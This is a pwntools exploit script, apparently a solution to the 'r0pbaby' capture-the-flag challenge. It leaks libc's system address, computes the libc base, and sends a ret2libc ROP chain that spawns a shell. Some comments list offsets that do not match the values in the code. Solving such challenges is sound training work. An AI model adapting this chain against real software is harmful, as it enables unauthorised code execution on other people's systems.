from pwn import *

p = process('./r0pbaby')

context(os = "linux", arch = "amd64")
#context.log_level = 'DEBUG'

p.sendline("2")
p.sendlineafter("symbol: ", "system")
system = long(p.recvline_startswith("Symbol")[-18:].lower(), 16)
log.success("System address: " + str(hex(system)))

system_offset = 0x48e20         # system@@GLIBC_2.2.5
pop_rdi_offset = 0x271cd        # 0x000000000002144f : pop rdi ; ret
sh_offset = 0x18a143            # 17d3f3 /bin/sh

base_libc = system - system_offset

log.success("Base libc address: " + str(hex(base_libc)))

junk = "A" * 8

pop_rdi = p64(pop_rdi_offset + base_libc)
sh = p64(sh_offset + base_libc)
system = p64(system)

payload = junk + pop_rdi + sh + system  # ROP chain

p.sendlineafter(": ", "3")
p.sendlineafter(": ", str(len(payload)))
p.sendline(payload)

p.interactive()
